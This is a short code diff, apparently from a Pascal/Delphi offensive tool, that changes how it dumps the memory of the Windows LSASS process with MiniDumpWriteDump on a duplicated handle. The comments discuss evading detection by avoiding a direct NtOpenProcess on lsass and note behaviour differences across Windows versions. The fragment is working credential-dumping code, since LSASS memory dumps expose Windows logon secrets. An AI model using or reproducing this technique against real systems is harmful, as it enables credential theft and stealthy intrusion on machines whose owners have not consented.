@@ -409,9 +409,10 @@ if processHandle<>thandle(-1) then
       MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
       //lets try with pid=0 to avoid an non necessary ntopenprocess on lsass
       //https://rastamouse.me/dumping-lsass-with-duplicated-handles/
-      result := MiniDumpWriteDump(clone, getcurrentprocessid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
+      //result := MiniDumpWriteDump(clone, getcurrentprocessid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
       //uhm...the above, i.e passing pid=0, seems to end with a corrupted dump, when using a callback...
-      //changed pid=0 to pid=getcurrentprocessid
+      //update #1:changed pid=0 to pid=getcurrentprocessid so that it works on latest win10
+      //update #2:disable this trick for now (w2k19 different behavior...) and sticking to pid=lsass pid ... which will trigger an ntopenprocess to lsass :(
       if result=false then result := MiniDumpWriteDump(clone, pid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
       if result=false then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)));
       //save dumpbuffer...
